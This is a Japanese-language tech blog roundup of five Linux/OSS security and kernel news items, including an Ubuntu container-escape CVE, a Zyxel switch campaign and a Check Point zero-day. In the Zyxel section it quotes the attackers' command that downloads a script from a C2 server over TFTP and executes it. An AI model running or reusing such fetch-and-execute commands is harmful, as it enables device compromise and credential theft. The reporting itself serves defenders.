---
title: "その修正、あなたの手元にありますか？（2026/9/24 Linux・OSSトレンド）"
date: 2026-09-24T00:00:00+09:00
draft: false
tags: ["セキュリティ", "CVE", "Ubuntu", "Linuxカーネル", "コンテナ", "Zyxel", "Check Point", "Asahi Linux", "Apple Silicon", "VFS"]
categories: ["Linux・OSSトレンド"]
---

## はじめに

修正が書かれてから、自分の機械に届くまでの道のりは、思っているよりずっと長い。今日はその距離を測る5本です。

上流でコミットがマージされても、ディストリビューションのパッケージに落ちてくるまでには時間がかかります。ベンダーがパッチを出しても、現場が適用するまでにはさらに時間がかかります。そして、セキュリティ製品自身の管理サーバーですら、その「届くまで」の空白を守り切れませんでした。

今日は、上流修正がまだディストリに届いていないカーネルの穴から始めて、パッチはあったのに届かなかったスイッチ、上流に入るまでの長い道のりを歩んでいる2つの改善を挟み、最後にまた「修正はあったのに、届く前に悪用された」管理サーバーの話で締めます。

{{< youtube "ruEmzT_weEA" >}}

## 1. Ubuntu CVE-2026-80521 — コンテナ脱出の PoC は出た、修正はまだ届いていない

AF_UNIX ソケットのガベージコレクタに存在する use-after-free 脆弱性 [CVE-2026-80521](https://ubuntu.com/security/CVE-2026-80521)（CVSS 7.8、`AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`）を突いて、コンテナからホストへ抜け出すエクスプロイトコードが公開されました。

経緯を追うと、届くまでの距離の長さがよくわかります。[研究グループ DepthFirst の報告](https://depthfirst.com/research/containers-are-no-longer-safe)によれば、同グループは2026年7月24日、Google がスポンサーするカーネル脆弱性コンテスト「kernelCTF」でこの脆弱性のエクスプロイトに成功。8月5日にカーネルセキュリティチームへ通知し、8月6日には上流（mainline 7.2 / stable 7.1.10）で修正がマージされました。CVE の報告者クレジットは、Arizona State University の Kyle Zeng 氏に帰属しています。ここまでは速い対応でした。ところが、上流の修正コミットがマージされてから、DepthFirst が9月22日に[Ubuntu 26.04 向けの完全な PoC を公開する](https://thehackernews.com/2026/09/exploit-released-for-unpatched-ubuntu.html)までの約7週間（47日）、Ubuntu 側にはこの修正が同梱されないままでした。

「全 LTS が未修正」というわけではありません。[Ubuntu の公式アドバイザリ](https://ubuntu.com/security/CVE-2026-80521)を確認すると、26.04（resolute）と 24.04（noble）は標準パッケージ「linux」が脆弱なまま。22.04（jammy）は標準カーネルこそ影響なしですが、`linux-hwe-6.8` や `linux-aws-6.8` といった HWE 系カーネルパッケージは脆弱です。20.04 以前は影響を受けません。パッケージによって濃淡があり、それがかえって「自分の環境は大丈夫なのか」を確認しづらくしています。

原因は、Ubuntu のアドバイザリが "GC could free a dead SCC partially" と要約する競合状態です。AF_UNIX ソケットは `SCM_RIGHTS` でファイルディスクリプタを渡す際に循環参照を作ることがあり、これを解放するガベージコレクタの処理に隙がありました。厄介なのは、AF_UNIX が Docker や Kubernetes の既定 seccomp プロファイルで許可されている点です。DepthFirst は、コンテナが日常的に実行する通常のシステムコールだけでこの脆弱性に到達し、権限昇格を実証しています。

DepthFirst が挙げる緩和策は、Kata Containers や Firecracker のような、ホストカーネルを共有しないカーネル分離技術の採用です。修正パッケージが配布されるまでは、`ubuntu.com/security/CVE-2026-80521` のステータス変化を追いかけるほかありません。

## 2. Zyxel GS1900 CVE-2026-7273 — パッチは6月にあった、それでも996台が食われた

Zyxel の GS1900 シリーズスイッチ10モデルに存在するスタックベースのバッファオーバーフロー [CVE-2026-7273](https://nvd.nist.gov/vuln/detail/CVE-2026-7273)（CVSS 8.8、`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`）は、LAN 内の未認証の攻撃者が細工した HTTP リクエストで OS コマンドを実行できる脆弱性です。[Zyxel は6月16日にパッチを公開](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-stack-based-buffer-overflow-vulnerability-in-gs1900-series-switches-06-16-2026)していましたが、実際の悪用が始まったのは8月17日から。全10モデルの修正版はいずれも末尾 `.2` のビルドとして提供されています。

[GreyNoise Intelligence の調査](https://www.greynoise.io/blog/open-season-on-kapibala-attacker-steals-government-records-wordpress-exploitation)によれば、侵害されたスイッチは48カ国、合計996台。攻撃コードは PyArmor 6.7.5 で難読化された Python スクリプトで、`--libc` や `--req-params` といったコマンドライン引数で他モデルへの転用にも対応していました。侵入後は TFTP 経由で `sh -c tftp -gr c -l /1 <C2サーバー> 6969;/bin/sh /1` というコマンドでコレクタースクリプトを取得・実行し、デバイス設定・ネットワークトポロジー・ハッシュ化された認証情報を窃取しています。

GreyNoise は、この攻撃者が Acronis の追跡する「Red Heron」と、C2 ドメインやマルウェア、戦術の重複から同一または関連すると指摘しています。同じアクターとみられるグループは2026年前半にも WordPress の脆弱性チェーンを悪用し、29カ国49組織から18,566件のレコードを窃取していました。さらに GreyNoise は、コードの反復パターンやコメントから、エクスプロイトの生成に LLM が使われた可能性も指摘しています。

そして最も重い事実が、996台のうち564台（約57%）が工場出荷時のデフォルト認証情報のまま運用されていたことです。CISA は9月21日に本脆弱性を KEV カタログへ追加し、連邦機関の修正期限は本日9月24日。根拠となる指令は [BOD 26-04](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) です。パッチは3か月以上前から存在していました。届かなかったのは技術の問題ではなく、運用の問題だったように見えます。

## 3. Apple Silicon Mac のスピーカーが mainline Linux で鳴る日へ — 28パッチ

セキュリティの谷を抜けて、少し明るい話です。[James Calligeros 氏が9月20日、28パッチをカーネルメーリングリストへ投稿しました](https://www.phoronix.com/news/Apple-Mac-Speaker-Headset-Linux)。Apple Silicon Mac のスピーカーとヘッドセットジャックを mainline Linux で鳴らすための変更で、新ドライバー「macaudio」と、ユーザー空間のスピーカー保護デーモン「speakersafetyd」を組み合わせた構成です。

Texas Instruments 製アンプにはハードウェアレベルの保護機構がなく、Apple は macOS でユーザー空間プラグインとして保護を実装していました。[speakersafetyd はこれを Linux で担う、開発者の知る限り初めての FOSS Smart Amp 実装](https://github.com/AsahiLinux/speakersafetyd)です。Rust 製のユーザー空間デーモンで、PCM キャプチャから電圧・電流を読み取り、Thiele/Small パラメーターでボイスコイルの温度をモデル化して出力を絞ります。デーモンが動いていない場合はフェイルセーフとして、[全スピーカーの kcontrol をミュート・ロックする](https://www.phoronix.com/news/Apple-Mac-Speaker-Headset-Linux)設計です。無効化するカーネルパラメーター名が `snd_soc_macaudio.please_blow_up_my_speakers`（直訳すると「私のスピーカーを吹き飛ばしてください」）というのも、警告としてよくできています。

現時点ではまだレビュー中で、マージは完了していません。M3 系は今回のパッチには含まれず、必要なハードウェアノードの多くが未整備であることが理由です。パッケージとしては、Debian testing にはすでに `speakersafetyd`（バージョン 2.0.1-3）が存在しています。上流に入るまでの道のりは、まだ半ばです。

## 4. Linux 7.4 の do_open() 最適化 — VFS の無駄が、ようやく削られる

もう1本、上流に向けて進んでいる途中の話です。Mateusz Guzik 氏によるパッチが、`do_open()` 内で dentry の参照を2回取得して1回しか解放しない無駄な処理を取り除きました。新関数 `vfs_open_consume()` を導入し、呼び出し元がすでに持っている dentry 参照をそのまま「消費」する形に変えることで、参照カウントの atomic 操作を1回分減らしています。変更は `fs/internal.h` / `fs/namei.c` / `fs/open.c` の3ファイルにとどまります。

[Phoronix の記事](https://www.phoronix.com/news/Linux-7.4-Faster-Do-Open)によれば、最終版（v5）の diffstat は「3 files changed, 39 insertions(+), 4 deletions(-)」。「約36行」という表現は、Phoronix の "three dozen lines" という概算表現に基づくものです。20コア VM 上の `will-it-scale` による[read1 ベンチマーク](https://ratatoskr.run/linux-fsdevel/2026/08/17357774/t)では、1秒あたり4,043,375回のオープンが5,629,378回まで伸び、+39.2%の改善。この値は2026年に再計測されたもので、2024〜2025年のv2・v3時点の値（+35%）とは異なります。

パッチは2024年8月にv2として初投稿されてから版を重ね、2026年8月3日にv4・v5が投稿されました。ただし、この記事の執筆時点で確認できた一次ソース上には、Al Viro 氏による Acked-by 等の正式な受理タグは見当たらず、`vfs.git` の特定ブランチへのキュー入りも確認できませんでした。合成ベンチマークの数値がそのまま実アプリの体感に反映されるとは限らない点にも注意が必要です。地道な最適化が、まだレビューの列に並んでいる段階だと捉えておくのが正確でしょう。

## 5. Check Point CVE-2026-93616 — ファイアウォールの司令塔が、2か月間無防備だった

最後は、また「修正はあったのに届かなかった」話です。Check Point Security Management Server の Web サービスに存在するパストラバーサル [CVE-2026-93616](https://nvd.nist.gov/vuln/detail/CVE-2026-93616)（CVSS 9.8、CWE-22、無認証）は、攻撃者が任意のファイルをアップロードし、任意のスクリプトを実行できる脆弱性です。7月23日から悪用が観測され始め、[Check Point が公式にパッチを公開したのは9月22日](https://blog.checkpoint.com/security/security-advisory-action-required-active-exploitation-of-cve-2026-85102-and-a-management-pre-authentication-vulnerability-cve-2026-93616)。悪用開始からパッチ公開まで、両端を含めて62日、動画タイトルの表現なら「2か月」です。

Check Point の同じアドバイザリでは、もう1件の脆弱性 CVE-2026-85102（Check Point Security Gateway / Spark Firewall の VPN 証明書検証不備による RCE、CVSS 9.8）も並記されています。この脆弱性が影響を受けるのは Check Point 製品であり、他社製品ではありません。CISA は9月22日、両脆弱性を KEV カタログに追加し、[BOD 26-04](https://www.cisa.gov/news-events/alerts/2026/09/22/cisa-adds-four-known-exploited-vulnerabilities-catalog) に基づいて連邦機関に9月25日という短期の修正期限を課しました。CISA と FBI は2024年5月の共同アラートで、パストラバーサル脆弱性を2007年に MITRE が「unforgivable」と評したことに触れ、この種の欠陥がいまだ根絶されていない現状を指摘しています。

対処として重要なのが、[LivePatch Take 28 / 29 ではこの脆弱性に対応しない](https://blog.checkpoint.com/security/security-advisory-action-required-active-exploitation-of-cve-2026-85102-and-a-management-pre-authentication-vulnerability-cve-2026-93616)という点です。公式ブログによれば、脆弱なのは R82.10 の Take 44 以下、R82 の Take 126 以下、R81.20 の Take 166 以下、R81.10 の Take 190 以下で、Jumbo Hotfix の手動適用が必須です。Check Point のサポート記事 SK1000171 を引く[複数の](https://windowsforum.com/news/cve-2026-85102-attacks-target-spark-vpns-93616-needs-hotfix.445704/)[報道](https://dev.to/anoymask/check-point-cve-2026-93616-actively-exploited-pre-authentication-path-traversal-leading-to-script-3ac1)によれば、修正版はそれぞれ Take 45 / 127 / 170 / 192 で、暫定的な回避策として TCP 19009 へのアクセス制限と、SmartConsole の「Trusted Clients」設定での接続元 IP 限定が案内されています。影響を受けるのは Security Management Server、Multi-Domain Security Management Server、Log Server、SmartEvent などです。Forkast は今回の事態を["The Control Tower Left Unguarded"（守られていなかった管制塔）](https://forkast.news/the-control-tower-left-unguarded-check-points-management-server-zero-day-gave-attackers-two-months-of-silent-access/)と表現しています。ファイアウォール群を統括する司令塔自体が、2か月間、無防備だったということです。

## まとめ

5本を通して見えたのは、「修正が書かれた場所」と「自分の機械」の間にある距離でした。

Ubuntu のカーネル修正は、上流にマージされてもパッケージにはまだ届いていません。Zyxel のパッチは6月から存在していたのに、3か月経っても564台には届かないままでした。Apple Silicon Mac のスピーカー対応も、do_open() の最適化も、上流にたどり着くまでの列にまだ並んでいます。そして Check Point の管理サーバーは、悪用が始まってから2か月、パッチという形でようやく修正が届きました。

「パッチが出た」と「自分の環境に適用された」は、まったく別の状態です。その修正、あなたの手元にありますか？

## 参考リンク

- [Ubuntu Security Advisory — CVE-2026-80521](https://ubuntu.com/security/CVE-2026-80521)
- [NVD — CVE-2026-7273](https://nvd.nist.gov/vuln/detail/CVE-2026-7273)
- [Zyxel 公式セキュリティアドバイザリ（GS1900シリーズ）](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-stack-based-buffer-overflow-vulnerability-in-gs1900-series-switches-06-16-2026)
- [GreyNoise Intelligence — Kapibala キャンペーンの調査レポート](https://www.greynoise.io/blog/open-season-on-kapibala-attacker-steals-government-records-wordpress-exploitation)
- [speakersafetyd — Asahi Linux 公式リポジトリ](https://github.com/AsahiLinux/speakersafetyd)
- [Phoronix — Linux 7.4 do_open() 最適化](https://www.phoronix.com/news/Linux-7.4-Faster-Do-Open)
- [Check Point 公式セキュリティアドバイザリ — CVE-2026-93616 / CVE-2026-85102](https://blog.checkpoint.com/security/security-advisory-action-required-active-exploitation-of-cve-2026-85102-and-a-management-pre-authentication-vulnerability-cve-2026-93616)
- [NVD — CVE-2026-93616](https://nvd.nist.gov/vuln/detail/CVE-2026-93616)
